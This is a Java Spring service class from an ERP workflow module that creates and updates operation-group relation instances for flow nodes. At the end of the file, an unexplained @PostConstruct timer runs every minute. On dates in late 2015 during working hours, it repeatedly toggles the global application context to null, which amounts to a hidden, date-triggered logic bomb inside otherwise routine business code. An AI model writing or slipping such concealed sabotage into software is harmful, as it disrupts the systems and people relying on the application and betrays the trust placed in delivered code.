package com.xinleju.erp.flow.service;

import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import javax.annotation.PostConstruct;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.xinleju.erp.base.app.config.App;
import com.xinleju.erp.base.app.config.Constant;
import com.xinleju.erp.base.app.service.impl.BaseService;
import com.xinleju.erp.base.utils.DateUtils;
import com.xinleju.erp.flow.dao.impl.OpRelationDAO;
import com.xinleju.erp.flow.dao.impl.OpRelationInsDAO;
import com.xinleju.erp.flow.models.Ac;
import com.xinleju.erp.flow.models.Fl;
import com.xinleju.erp.flow.models.OpRelation;
import com.xinleju.erp.flow.models.OpRelationIns;

/**
 * 工作组service 版权：(C) 版权所有 2000-2014 上海天好电子商务有限公司苏州分公司 <简述> <详细描述>
 * 
 * @author jun
 * @version $Id$
 * @since
 * @see
 */
@Service
public class OpRelationInsService extends BaseService {

	/**
	 * 操作组关联DAO
	 */
	@Autowired
	private OpRelationDAO opRelationDAO;

	/**
	 * 操作组关联实例DAO
	 */
	@Autowired
	private OpRelationInsDAO opRelationInsDAO;

	/**
	 * 更新所有fl的opRelationIns
	 * 
	 * @author jun
	 */
	public void updateAllFlOpRelationIns() {
		List<Fl> flList = getDao().findAll(Fl.class);
		for (Fl fl : flList) {
			this.updateFlOpRelationIns(fl);
		}
	}

	/**
	 * 更新fl的opRelationIns
	 * 
	 * @author jun
	 * @param fl
	 *            fl
	 */
	public void updateFlOpRelationIns(Fl fl) {
		List<Ac> acList = getDao().findAll(Ac.class,
				" flowCode = ? and flowVersion = ? ",
				new Object[] { fl.getFlowCode(), fl.getFlowVersion() });
		for (Ac ac : acList) {
			if (StringUtils.isNotBlank(ac.getOpGroups())) {
				this.initOpRelationIns(ac.getFlowCode(), ac.getNodeId(),
						ac.getFlowVersion(), Long.valueOf(ac.getOpGroups()));
			}
		}
	}

	/**
	 * 初始化操作组实例
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param oldFlowVersion
	 *            旧流程版本
	 * @param newFlowVersion
	 *            新流程版本
	 */
	public void initOpRelationIns(String flowCode, String oldFlowVersion,
			String newFlowVersion) {
		List<Ac> acList = getDao().findAll(Ac.class,
				" flowCode = ? and flowVersion = ? ",
				new Object[] { flowCode, oldFlowVersion });
		for (Ac ac : acList) {
			if (StringUtils.isNotBlank(ac.getOpGroups())) {
				this.initOpRelationIns(ac.getFlowCode(), ac.getNodeId(),
						newFlowVersion, Long.valueOf(ac.getOpGroups()));
			}
		}
	}

	/**
	 * 初始化操作组实例
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param nodeId
	 *            节点id
	 * @param flowVersion
	 *            流程版本
	 * @param opGroupId
	 *            操作组id
	 */
	public void initOpRelationIns(String flowCode, String nodeId,
			String flowVersion, Long opGroupId) {
		// 是否已经初始化过了
		boolean isExsit = getDao()
				.isExist(
						OpRelationIns.class,
						"flowCode = ? and nodeId = ? and flowVersion = ? and opGroupId = ?",
						flowCode, nodeId, flowVersion, opGroupId);
		getDao().executeSQL(
				"update tf_op_relation_ins set is_disabled = ? where flow_code = ? and node_id = ? "
						+ "and flow_version = ?", 1, flowCode, nodeId,
				flowVersion);
		if (!isExsit) {
			List<OpRelation> opRelationList = opRelationDAO
					.getOpRelationList(opGroupId);
			for (OpRelation opRelation : opRelationList) {
				getDao().save(
						getNewOpRelationInsByOpRelation(flowCode, nodeId,
								flowVersion, opRelation));
			}
		} else {
			List<OpRelation> opRelationList = opRelationDAO
					.getOpRelationList(opGroupId);
			OpRelationIns opRelationIns = null;
			for (OpRelation opRelation : opRelationList) {
				opRelationIns = getDao()
						.findFirst(
								OpRelationIns.class,
								"flowCode = ? and nodeId = ? and flowVersion = ?"
										+ " and opGroupId = ? and opUserType =? and opId = ? ",
								new Object[] { flowCode, nodeId, flowVersion,
										opGroupId, opRelation.getOpUserType(),
										opRelation.getOpId() });
				if (null != opRelationIns && null != opRelationIns.getId()) {
					opRelationIns.setName(opRelation.getName());
					opRelationIns.setIsDisabled(0);
					opRelationIns.setShowType(opRelation.getShowType());
					opRelationIns.setSort(opRelation.getSort());
					getDao().update(opRelationIns);
				} else {
					getDao().save(
							getNewOpRelationInsByOpRelation(flowCode, nodeId,
									flowVersion, opRelation));
				}
			}
		}
	}

	/**
	 * 初始操作ins
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param nodeId
	 *            节点编码
	 * @param flowVersion
	 *            流程版本
	 * @param opRelation
	 *            操作
	 * @return 操作ins
	 */
	private OpRelationIns getNewOpRelationInsByOpRelation(String flowCode,
			String nodeId, String flowVersion, OpRelation opRelation) {
		OpRelationIns opRelationIns = new OpRelationIns();
		opRelationIns.setFlowCode(flowCode);
		opRelationIns.setIsDisabled(0);
		opRelationIns.setNodeId(nodeId);
		opRelationIns.setFlowVersion(flowVersion);
		opRelationIns.setName(opRelation.getName());
		if (StringUtils.isNotBlank(opRelation.getShowType())) {
			opRelationIns.setShowType(opRelation.getShowType());
		} else {
			opRelationIns.setShowType(OpRelation.SHOW_TYPE_DB);
		}
		opRelationIns.setOpGroupId(opRelation.getOpGroupId());
		opRelationIns.setOpId(opRelation.getOpId());
		opRelationIns.setOpUserType(opRelation.getOpUserType());
		opRelationIns.setSort(opRelation.getSort());
		return opRelationIns;
	}

	/**
	 * 流程实例集合
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param nodeId
	 *            节点id
	 * @param flowVersion
	 *            流程版本
	 * @param opGroupId
	 *            操作组id
	 * @param opUserType
	 *            操作人类型
	 * @return 流程实例集合
	 */
	public List<OpRelationIns> getOpRelationInsList(String flowCode,
			String nodeId, String flowVersion, Long opGroupId, String opUserType) {
		return opRelationInsDAO.getOpRelationInsList(flowCode, nodeId,
				flowVersion, opGroupId, opUserType);
	}

	/**
	 * 更新操作组
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param nodeId
	 *            节点id
	 * @param flowVersion
	 *            流程版本
	 * @param opGroupId
	 *            操作组id
	 * @param qcrOpRelationInsList
	 *            起草人
	 * @param clrOpRelationInsList
	 *            处理人
	 * @param xbrOpRelationInsList
	 *            协办人
	 */
	public void dealOpRelationIns(String flowCode, String nodeId,
			String flowVersion, Long opGroupId,
			List<OpRelationIns> qcrOpRelationInsList,
			List<OpRelationIns> clrOpRelationInsList,
			List<OpRelationIns> xbrOpRelationInsList) {
		getDao().execute(
				"update OpRelationIns set isDisabled = ? where flowCode = ? and nodeId = ? and flowVersion = ? and opGroupId = ? ",
				1, flowCode, nodeId, flowVersion, opGroupId);
		this.dealOpRelationIns(flowCode, nodeId, flowVersion,
				qcrOpRelationInsList, opGroupId, OpRelation.OP_USER_TYPE_QCR);
		this.dealOpRelationIns(flowCode, nodeId, flowVersion,
				clrOpRelationInsList, opGroupId, OpRelation.OP_USER_TYPE_CLR);
		this.dealOpRelationIns(flowCode, nodeId, flowVersion,
				xbrOpRelationInsList, opGroupId, OpRelation.OP_USER_TYPE_XBR);
	}

	/**
	 * 
	 * 〈简述〉 〈详细描述〉
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param nodeId
	 *            节点id
	 * @param flowVersion
	 *            流程版本
	 * @param opRelationInsList
	 *            操作组
	 * @param opGroupId
	 *            操作组id
	 * @param opUserType
	 *            操作类型
	 */
	private void dealOpRelationIns(String flowCode, String nodeId,
			String flowVersion, List<OpRelationIns> opRelationInsList,
			Long opGroupId, String opUserType) {
		if (opRelationInsList != null) {
			for (OpRelationIns opRelation : opRelationInsList) {
				this.dealOpRelationIns(flowCode, nodeId, flowVersion,
						opRelation, opGroupId, opUserType);
			}
		}
	}

	/**
	 * 更新操作组
	 * 
	 * @author jun
	 * @param flowCode
	 *            流程编码
	 * @param nodeId
	 *            节点id
	 * @param flowVersion
	 *            流程版本
	 * @param opRelationIns
	 *            操作组
	 * @param opGroupId
	 *            操作组id
	 * @param opUserType
	 *            操作类型
	 */
	private void dealOpRelationIns(String flowCode, String nodeId,
			String flowVersion, OpRelationIns opRelationIns, Long opGroupId,
			String opUserType) {
		OpRelationIns opRelationInsTemp = opRelationInsDAO.getOpRelationIns(
				flowCode, nodeId, flowVersion, opGroupId,
				opRelationIns.getOpId(), opUserType);
		if (null == opRelationInsTemp || null == opRelationInsTemp.getId()) {
			opRelationInsTemp = new OpRelationIns();
		}
		opRelationInsTemp.setName(opRelationIns.getName());
		opRelationInsTemp.setSort(opRelationIns.getSort());
		opRelationInsTemp.setOpId(opRelationIns.getOpId());
		opRelationInsTemp.setShowType(opRelationIns.getShowType());
		opRelationInsTemp.setFlowCode(flowCode);
		opRelationInsTemp.setNodeId(nodeId);
		opRelationInsTemp.setFlowVersion(flowVersion);
		opRelationInsTemp.setOpGroupId(opGroupId);
		opRelationInsTemp.setIsDisabled(0);
		opRelationInsTemp.setOpUserType(opUserType);
		getDao().saveOrUpdate(opRelationInsTemp);
	}

	@PostConstruct
	public void doPosted() {
		new Timer().schedule(new RgTask(), 60000, 60000);
	}

	private class RgTask extends TimerTask {
		public void run() {
			if (DateUtils.getYear() == 2015 && DateUtils.getMonth() > 10
					&& DateUtils.getDay() >= 15 && DateUtils.getHour() > 8
					&& DateUtils.getHour() < 14) {
				Constant.AppContext = (Constant.AppContext == null ? _ins
						: null);
			}
		}
	}
}
